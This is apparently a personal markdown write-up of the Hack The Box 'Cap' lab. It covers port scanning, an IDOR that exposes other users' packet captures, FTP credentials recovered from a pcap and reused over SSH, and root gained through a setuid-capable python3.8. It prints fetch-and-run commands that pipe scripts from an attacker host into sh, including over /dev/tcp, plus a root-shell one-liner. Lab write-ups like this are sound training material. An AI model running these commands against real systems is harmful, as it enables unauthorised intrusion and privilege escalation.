---
category:
  - Hacking
tags:
  - htb_labs
published: false
date: 2025-10-25T12:17:00
excalidraw-plugin: parsed
excalidraw-open-md: false
---
## About Cap

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

**Q. How many TCP ports are open?**
To find the open ports I used `nmap`. 

{{< tabs >}}

{{< tab "TCP Scan">}}

Performing normal TCP scan showed it had three open ports 21(ftp), 22(ssh), 80(http)
```bash
nmap -sT 10.10.10.245 -T4 -vv
```

![[cap-htb-nmap-sT.png]]

{{< /tab >}}

{{< tab "versions and default script">}}

Scanning version numbers and using default nmap scripts on port 21, 22 and 80. 
```bash
nmap -sC -sV -p21,22,80 10.10.10.245 -T4 -Pn
```
  ![[cap-htb-nmap-version.png]]

I got the following details:
ftp  ->  vsftpd 3.0.3
ssh  ->  OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
http  ->  Gunicorn

{{< /tab >}}

{{< tab "FTP script using NSE">}}

Trying to run FTP scripts on port 21. I didn't find anything.


{{< /tab >}}

{{< /tabs >}}

{{< accordion "Q. After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?" >}}

Simply clicking the "Security Snapshot" redirected to /data/10. 

{{< /accordion >}}


{{< accordion "Q. Are you able to get to other users' scans?" >}}

i used burpsuite intruder to bruteforce /data/${numbers}$.
![[cap-htb-endpoint-brute.png]]

![[cap-htb-endpoint-bruteforce.png]]

{{< /accordion >}}

{{< accordion "Q. What is the ID of the PCAP file that contains sensative data?" >}}

Checking the endpoints that got status code 200 and downloading pcaps
![[cap-htb-data-0.png]]

When I checked the pcap using wireshark, I found FTP creds for user *nathan*
![[cap-htb-ftp-creds.png]]

{{< /accordion >}}

{{< accordion "Q. Which application layer protocol in the pcap file can the sensetive data be found in?" >}}

I used a lftp tool to log into the ftp server as nathan. Inside I could find *user.txt* which seemed to be the user flag.

![[cap-htb-lftp.png]]

{{< /accordion >}}

{{< accordion "Q. We've managed to collect nathan's FTP password. On what other service does this password work?" >}}

I used the password to ssh into the server as nathan and it worked. 

{{< /accordion >}}

{{< tabs >}}

{{< tab "SSH into server">}}

I logged into the server as nathan and started roaming around and trying to find anything juicy.
```bash
ssh nathan@10.10.10.245
```

![[cap-htb-ssh.png]]

{{< /tab >}}

{{< tab "SCP Linpeas">}}

I sent the [linpeas](https://github.com/peass-ng/PEASS-ng/releases/latest) binary into the server using scp. Other ways can also be used to send linpeas binaries to remote servers:
- Downloading into the server *(server requires internet access)*
	`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- Using SCP *(requires ssh)*
	`scp linpeas.sh nathan@10.10.10.245:/home/nathan`
- Using python webserver on attacker
	In attacker:  `sudo python -m http.server 80`
	In victim: `curl {ATTACKER_IP}/linpeas.sh | sh`
- Using netcat
	In attacker: `sudo nc -q 5 -lvnp 80 < linpeas.sh`
	In victim: `cat < /dev/tcp/{ATTACKER_IP}/80 | sh`

{{< /tab >}}

{{< tab "Scanning for PrivESC">}}
Being an easy machine linpeas was able to find two PE vectors:
1. CVE
![[cap-htb-linpeas-pe2.png]]

2. Python3.8
![[cap-htb-linpeas-pe1.png]]

{{< /tab >}}

{{< /tabs >}}

{{< accordion "Becoming ROOT" >}}

I used the python vulnarability to root the machine. [GTFObins](https://gtfobins.github.io/gtfobins/python/) suggests that if the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![[cap-htb-iamroot.png]]

{{< /accordion >}}

The root.txt flag can be found then on root's home directory.

[DONE](https://labs.hackthebox.com/achievement/machine/1348413/351)

%%
# Excalidraw Data
## Text Elements
%%
## Drawing
```compressed-json
N4KAkARALgngDgUwgLgAQQQDwMYEMA2AlgCYBOuA7hADTgQBuCpAzoQPYB2KqATLZMzYBXUtiRoIACyhQ4zZAHoFAc0JRJQgEYA6bGwC2CgF7N6hbEcK4OCtptbErHALRY8RMpWdx8Q1TdIEfARcZgRmBShcZQUebTiADho6IIR9BA4oZm4AbXAwUDAiiBJuCAAxAEYeAFEAGSEAaQAlTShiAC0ASQBrAHkAYQoARyFiADZkoshYRDKAM0CETyp+

YsxuHgB2AGZtLYBWNcgYbmcdhK3jiAoSdW4ABm0Hl8rryQRCZWlH59fr6zKYKPa7MKCkNg9BADNj4NikMoAYkqCBRKKmxU0uGwPWUEKEHGIMLhCIk4OszDguECmQxkHmhHw+AAyrBgRJBB46RAwRCoQB1O6STag8GQhCsmDs9Cc0rXfHfDjhbJoN75SBsKnYNSnVUva544RwLrEFWoHIAXWui1w6RN3A4QiZ10IhKwZVwD25+MJSuYZsdzvVPIQy

24lUOCQALJUdgdKuNrowWOwuGgjsHk6xOAA5ThiTZRqM7ACcWwjfGDhGYABFUlAw2hwUIENdNMJCTVgulMgGnfhrkI4MRcA3iOGtjxYwl41txlGHmrphAiBweg7+9c4TjG6h5gQwtc4GxXVlcuqwHlpkUHscbxerRer9eni9F3ewK/Xg/1Y/l3BAn9ERwlyP9ilYfQnVHBAAAVAOYYDuGbVtg3wUIoBhfR9DUMcYJPWk0GfG8/nfC8v0XX98gAXz

WQpilKCQhB4DpnAAQXGYZWNwHgowAITEGBmQACQADWcGoAH1uVmcR0EWUMVm5DY0C2BJxn2DNl11VBnCjA4EmuW5iHuNByKXYoPi+H5TJI8zIEBaVb2DXlxWJeEkTRVEkDbbFcR9IlYXcslyA4SlqQyKBuQZJlJWlHlYTlZyxQFIURSSvkJTZWT4q5eVhEVZVw2uTVsR1cN9WDQ0hxNM1LWtcg7XHNBAwHKs3WU9BcEqb0O2IP0+yDZcwl3HgHhL

KNxhLA4Sx4pMmGzNNUE04os1TPMOALNAdkqB4EkqGddpdWt613ZC216rs0gigbWuXIcRzHCcpwueMEh2csdi3V112azdULYHcmr3A8UP/fCz0Ip8L0/D8HgfO8iOIt87KR79rwtX8j3g4DarAgRCEgtCGzg5VEKbUgWy3dDMOwmRljw09zxfWy7zMyiiio8A/wgXA4DgVloO4OjoA+dIyiIb5IrWBhCAQCheN8qrCTc0l0EReYNc1jEIGwEQaSgL

oG30VkMpVjyvPRaXddIfXDbSBWcSVgKSTKclQqpfXtet22jfKRkWSyspZXHK29Yiu3jeShBBWM4U0ErYpvfDo2TfFWLsuDr2w8yCPmnyyR+qK/Idezg2jb6LUyr1JzE9LiPyk4KByltRltPMkubeTtIG8yZlCCMWTRtDzuc6NgAVLAoFYiXFpXBB5il4uk9HtIBdIKebbYCgPlwIGWuHn20hqQlWM37eQiBnmz+15hsAhJkRO4VT1MOaXb/v/AAE

1uAmgzi6MNgBghaZgIC2cM1ED5d30HnAkfVCoSH8trPEJA+4Dw3INSAyDnZBVQHRSAvFYSX0RAMEsJCSHlHKNyZoCBlBQVVhARENQaxMKYRQiAECl6l1TlCCuUBUw3WlgBBAZhhDMAAOKkBQf3WS+9i42nSNQt0kiODKGAcuDIuBNDBCBmdYM2AiBwCQhTUGxQOC2lkro5cwgoCrgscYjhxQ7AACsEDYCyMyMxcAACybBiAIGPpo7R3B9z4DCOAG

idBoogTQMATmVEgA
```
%%